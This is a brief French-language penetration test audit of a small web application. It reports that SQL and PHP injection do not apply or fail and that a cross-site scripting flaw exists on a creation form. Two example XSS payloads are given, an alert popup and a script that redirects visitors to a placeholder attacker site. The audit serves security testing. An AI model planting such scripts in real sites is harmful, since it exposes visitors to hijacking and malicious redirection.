# Audit Pentest

> Application testé : Etienne Blanc-Coquand, https://github.com/bcetienne/security_test

### Démarche

- Les données étant sauvegardés dans un fichier JSON, aucune attaque de type injection sql n'est envisageable.
- Test d'injection de code PHP, sans succès.
- Test d'injection de script JS, avec succès.

### Failles 

- XSS, faille de sécurité de type Cross Site Scripting sur le formulaire de création.
- exemple :
> popup intenpestif

`<script>alert('hacked by toto')</script>`

> redirection vers un site défini

`<script language="javascript">document.location.href="http://site-du-hacker.com/"</script>`

